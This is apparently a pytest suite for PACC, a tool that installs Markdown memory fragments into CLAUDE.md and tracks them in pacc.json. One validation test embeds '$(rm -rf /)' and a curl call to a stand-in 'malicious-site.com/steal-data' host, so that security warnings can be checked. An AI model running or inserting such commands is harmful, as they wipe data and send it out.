"""Tests for Fragment Installation Workflow - PACC-50."""

import json
import shutil
import tempfile
from pathlib import Path
from unittest.mock import MagicMock, Mock, patch

import pytest

from pacc.errors.exceptions import PACCError, ValidationError
from pacc.fragments.claude_md_manager import CLAUDEmdManager
from pacc.fragments.installation_manager import FragmentInstallationManager
from pacc.fragments.storage_manager import FragmentStorageManager


class TestFragmentInstallationManager:
    """Test Fragment Installation Manager functionality."""

    def setup_method(self):
        """Set up test environment."""
        self.temp_dir = Path(tempfile.mkdtemp())
        self.project_root = self.temp_dir / "project"
        self.project_root.mkdir()

        # Initialize managers with test directories
        self.installation_manager = FragmentInstallationManager(project_root=self.project_root)
        self.claude_md_manager = CLAUDEmdManager(project_root=self.project_root)
        self.storage_manager = FragmentStorageManager(project_root=self.project_root)

        # Create test CLAUDE.md and pacc.json
        self.claude_md_path = self.project_root / "CLAUDE.md"
        self.pacc_json_path = self.project_root / "pacc.json"

        # Create initial CLAUDE.md content
        self.claude_md_path.write_text("""# Test Project

This is a test project.
""")

        # Create initial pacc.json content
        initial_config = {"name": "test-project", "version": "1.0.0", "fragments": {}}
        self.pacc_json_path.write_text(json.dumps(initial_config, indent=2))

    def teardown_method(self):
        """Clean up test environment."""
        if self.temp_dir.exists():
            shutil.rmtree(self.temp_dir)

    def test_init_with_default_project_root(self):
        """Test initialization with default project root."""
        manager = FragmentInstallationManager()
        assert manager.project_root == Path.cwd().resolve()

    def test_init_with_custom_project_root(self):
        """Test initialization with custom project root."""
        manager = FragmentInstallationManager(project_root=self.project_root)
        assert manager.project_root == self.project_root.resolve()

    def test_source_resolution_git_repo(self):
        """Test source resolution for Git repositories."""
        git_url = "https://github.com/user/repo.git"
        source = self.installation_manager.resolve_source(git_url)

        assert source.source_type == "git"
        assert source.location == git_url
        assert source.is_remote is True

    def test_source_resolution_local_path(self):
        """Test source resolution for local paths."""
        local_path = self.temp_dir / "fragments"
        local_path.mkdir()

        source = self.installation_manager.resolve_source(str(local_path))

        assert source.source_type == "local"
        assert Path(source.location) == local_path.resolve()
        assert source.is_remote is False

    def test_source_resolution_collection(self):
        """Test source resolution for collections."""
        # Create a collection directory with fragments
        collection_dir = self.temp_dir / "my_collection"
        collection_dir.mkdir()

        # Create fragment files
        (collection_dir / "fragment1.md").write_text("# Fragment 1\nContent")
        (collection_dir / "fragment2.md").write_text("# Fragment 2\nContent")

        source = self.installation_manager.resolve_source(str(collection_dir))

        assert source.source_type == "collection"
        assert source.is_collection is True
        assert len(source.fragments) == 2

    def test_source_resolution_invalid_path(self):
        """Test source resolution for invalid paths."""
        invalid_path = self.temp_dir / "nonexistent"

        with pytest.raises(PACCError, match="Source not found"):
            self.installation_manager.resolve_source(str(invalid_path))

    @patch("pacc.sources.git.GitCloner")
    def test_install_from_git_repository(self, mock_git_cloner):
        """Test installation from Git repository."""
        # Mock Git cloner
        mock_cloner_instance = MagicMock()
        mock_git_cloner.return_value = mock_cloner_instance

        # Create mock repository content
        mock_repo_dir = self.temp_dir / "mock_repo"
        mock_repo_dir.mkdir()
        fragment_file = mock_repo_dir / "test_fragment.md"
        fragment_file.write_text("""---
title: "Test Fragment"
description: "A test memory fragment"
---

# Test Fragment

This is a test fragment for memory storage.
""")

        mock_cloner_instance.clone.return_value = mock_repo_dir

        # Test installation
        git_url = "https://github.com/user/repo.git"
        result = self.installation_manager.install_from_source(git_url, target_type="project")

        assert result.success is True
        assert result.installed_count == 1
        assert "test_fragment" in result.installed_fragments

    def test_install_from_local_path_single_fragment(self):
        """Test installation from local single fragment file."""
        # Create a test fragment file
        fragment_file = self.temp_dir / "test_fragment.md"
        fragment_file.write_text("""---
title: "Local Test Fragment"
description: "A local test memory fragment"
---

# Local Test Fragment

This is a local test fragment.
""")

        # Test installation
        result = self.installation_manager.install_from_source(
            str(fragment_file), target_type="project"
        )

        assert result.success is True
        assert result.installed_count == 1
        assert "test_fragment" in result.installed_fragments

    def test_install_from_collection_with_interactive_selection(self):
        """Test installation from collection with interactive selection."""
        # Create a collection directory
        collection_dir = self.temp_dir / "test_collection"
        collection_dir.mkdir()

        # Create multiple fragments
        fragments = [
            ("auth_patterns.md", "# Authentication Patterns\nAuth stuff"),
            ("db_queries.md", "# Database Queries\nDB stuff"),
            ("api_examples.md", "# API Examples\nAPI stuff"),
        ]

        for name, content in fragments:
            (collection_dir / name).write_text(content)

        # Mock interactive selection to select first two fragments
        with patch("pacc.ui.components.MultiSelectList") as mock_selector:
            mock_selector.return_value.show.return_value = [0, 1]  # Select first two

            result = self.installation_manager.install_from_source(
                str(collection_dir), target_type="project", interactive=True
            )

        assert result.success is True
        assert result.installed_count == 2
        assert "auth_patterns" in result.installed_fragments
        assert "db_queries" in result.installed_fragments
        assert "api_examples" not in result.installed_fragments

    def test_install_all_from_collection(self):
        """Test installation of all fragments from collection."""
        # Create a collection directory
        collection_dir = self.temp_dir / "test_collection"
        collection_dir.mkdir()

        # Create multiple fragments
        for i in range(3):
            fragment_file = collection_dir / f"fragment_{i}.md"
            fragment_file.write_text(f"# Fragment {i}\nContent for fragment {i}")

        # Test installation with install_all=True
        result = self.installation_manager.install_from_source(
            str(collection_dir), target_type="project", install_all=True
        )

        assert result.success is True
        assert result.installed_count == 3

    def test_claude_md_section_insertion(self):
        """Test CLAUDE.md section creation and insertion."""
        # Install a fragment
        fragment_file = self.temp_dir / "test_fragment.md"
        fragment_file.write_text("""---
title: "Test Fragment"
description: "A test fragment"
---

# Test Fragment
Content here.
""")

        result = self.installation_manager.install_from_source(
            str(fragment_file), target_type="project"
        )

        assert result.success is True

        # Check CLAUDE.md was updated with section
        claude_md_content = self.claude_md_path.read_text()
        assert "<!-- PACC:fragments:START -->" in claude_md_content
        assert "<!-- PACC:fragments:END -->" in claude_md_content
        assert "@test_fragment" in claude_md_content

    def test_reference_path_generation(self):
        """Test @reference path generation for installed fragments."""
        # Install a fragment
        fragment_file = self.temp_dir / "memory_fragment.md"
        fragment_file.write_text("# Memory Fragment\nUseful information.")

        result = self.installation_manager.install_from_source(
            str(fragment_file), target_type="project"
        )

        assert result.success is True

        # Check reference path is generated correctly
        expected_ref_path = ".claude/pacc/fragments/memory_fragment.md"
        fragment_info = result.installed_fragments["memory_fragment"]
        assert fragment_info["reference_path"] == expected_ref_path

    def test_user_level_installation(self):
        """Test user-level fragment installation."""
        fragment_file = self.temp_dir / "user_fragment.md"
        fragment_file.write_text("# User Fragment\nUser-level content.")

        result = self.installation_manager.install_from_source(
            str(fragment_file), target_type="user"
        )

        assert result.success is True

        # Check fragment was stored in user directory
        user_storage = Path.home() / ".claude/pacc/fragments"
        installed_fragment = user_storage / "user_fragment.md"
        assert installed_fragment.exists()

    def test_pacc_json_tracking(self):
        """Test pacc.json is updated to track installed fragments."""
        fragment_file = self.temp_dir / "tracked_fragment.md"
        fragment_file.write_text("""---
title: "Tracked Fragment"
description: "This fragment should be tracked"
---

# Tracked Fragment
Content here.
""")

        result = self.installation_manager.install_from_source(
            str(fragment_file), target_type="project"
        )

        assert result.success is True

        # Check pacc.json was updated
        pacc_config = json.loads(self.pacc_json_path.read_text())
        assert "fragments" in pacc_config
        assert "tracked_fragment" in pacc_config["fragments"]

        fragment_entry = pacc_config["fragments"]["tracked_fragment"]
        assert fragment_entry["title"] == "Tracked Fragment"
        assert fragment_entry["description"] == "This fragment should be tracked"
        assert "installed_at" in fragment_entry
        assert fragment_entry["storage_type"] == "project"

    def test_atomic_installation_rollback_on_failure(self):
        """Test atomic installation with rollback on failure."""
        # Create a fragment that will cause validation failure
        invalid_fragment = self.temp_dir / "invalid_fragment.md"
        invalid_fragment.write_text("Invalid content without proper structure")

        # Mock validation to fail after storage but before CLAUDE.md update
        with patch.object(self.installation_manager.validator, "validate_single") as mock_validate:
            # First validation passes, second fails
            mock_validate.side_effect = [
                Mock(is_valid=True, errors=[], metadata={"title": "Test"}),
                ValidationError("Simulated failure during CLAUDE.md update"),
            ]

            # Installation should fail and rollback
            result = self.installation_manager.install_from_source(
                str(invalid_fragment), target_type="project"
            )

            assert result.success is False
            assert result.installed_count == 0

            # Check rollback occurred - no fragment in storage
            project_storage = self.project_root / ".claude/pacc/fragments"
            if project_storage.exists():
                fragments = list(project_storage.glob("*.md"))
                assert len(fragments) == 0

            # Check CLAUDE.md wasn't modified
            claude_md_content = self.claude_md_path.read_text()
            assert "invalid_fragment" not in claude_md_content

    def test_fragment_validation_during_installation(self):
        """Test fragment validation during installation process."""
        # Create an invalid fragment (missing frontmatter, suspicious content)
        invalid_fragment = self.temp_dir / "suspicious_fragment.md"
        invalid_fragment.write_text("""# Suspicious Fragment

This fragment contains potentially dangerous content:
$(rm -rf /)
curl malicious-site.com/steal-data
""")

        result = self.installation_manager.install_from_source(
            str(invalid_fragment), target_type="project"
        )

        # Installation should succeed but with warnings
        assert result.success is True
        assert len(result.validation_warnings) > 0

        # Check security warnings are present
        security_warnings = [
            w
            for w in result.validation_warnings
            if "security" in w.lower() or "dangerous" in w.lower()
        ]
        assert len(security_warnings) > 0

    def test_force_installation_with_validation_errors(self):
        """Test forced installation despite validation errors."""
        # Create a fragment with validation errors
        error_fragment = self.temp_dir / "error_fragment.md"
        error_fragment.write_text("Invalid content")

        # Mock validator to return errors
        with patch.object(self.installation_manager.validator, "validate_single") as mock_validate:
            validation_result = Mock()
            validation_result.is_valid = False
            validation_result.errors = ["INVALID_FORMAT"]
            validation_result.metadata = {"title": "Error Fragment"}
            mock_validate.return_value = validation_result

            # Should fail without force
            result = self.installation_manager.install_from_source(
                str(error_fragment), target_type="project", force=False
            )
            assert result.success is False

            # Should succeed with force
            result = self.installation_manager.install_from_source(
                str(error_fragment), target_type="project", force=True
            )
            assert result.success is True

    def test_dry_run_mode(self):
        """Test dry-run mode doesn't make actual changes."""
        fragment_file = self.temp_dir / "dry_run_fragment.md"
        fragment_file.write_text("# Dry Run Fragment\nContent here.")

        # Save initial state
        initial_claude_md = self.claude_md_path.read_text()
        initial_pacc_json = self.pacc_json_path.read_text()

        result = self.installation_manager.install_from_source(
            str(fragment_file), target_type="project", dry_run=True
        )

        assert result.success is True
        assert result.installed_count == 1  # Shows what would be installed

        # Check no actual changes were made
        assert self.claude_md_path.read_text() == initial_claude_md
        assert self.pacc_json_path.read_text() == initial_pacc_json

        # Check fragment wasn't actually stored
        project_storage = self.project_root / ".claude/pacc/fragments"
        if project_storage.exists():
            fragments = list(project_storage.glob("*.md"))
            assert len(fragments) == 0

    def test_duplicate_fragment_handling(self):
        """Test handling of duplicate fragment installations."""
        fragment_file = self.temp_dir / "duplicate_fragment.md"
        fragment_file.write_text("# Duplicate Fragment\nContent here.")

        # Install fragment first time
        result1 = self.installation_manager.install_from_source(
            str(fragment_file), target_type="project"
        )
        assert result1.success is True

        # Try to install same fragment again (should fail without force)
        result2 = self.installation_manager.install_from_source(
            str(fragment_file), target_type="project", force=False
        )
        assert result2.success is False
        assert "already exists" in result2.error_message.lower()

        # Should succeed with force
        result3 = self.installation_manager.install_from_source(
            str(fragment_file), target_type="project", force=True
        )
        assert result3.success is True

    def test_installation_result_metadata(self):
        """Test installation result contains proper metadata."""
        fragment_file = self.temp_dir / "metadata_fragment.md"
        fragment_file.write_text("""---
title: "Metadata Fragment"
description: "Fragment with metadata"
tags: ["test", "metadata"]
---

# Metadata Fragment
Content with metadata.
""")

        result = self.installation_manager.install_from_source(
            str(fragment_file), target_type="project"
        )

        assert result.success is True
        assert result.installed_count == 1
        assert result.target_type == "project"
        assert result.source_type == "local"

        fragment_info = result.installed_fragments["metadata_fragment"]
        assert fragment_info["title"] == "Metadata Fragment"
        assert fragment_info["description"] == "Fragment with metadata"
        assert fragment_info["tags"] == ["test", "metadata"]
        assert "installed_at" in fragment_info
        assert "reference_path" in fragment_info
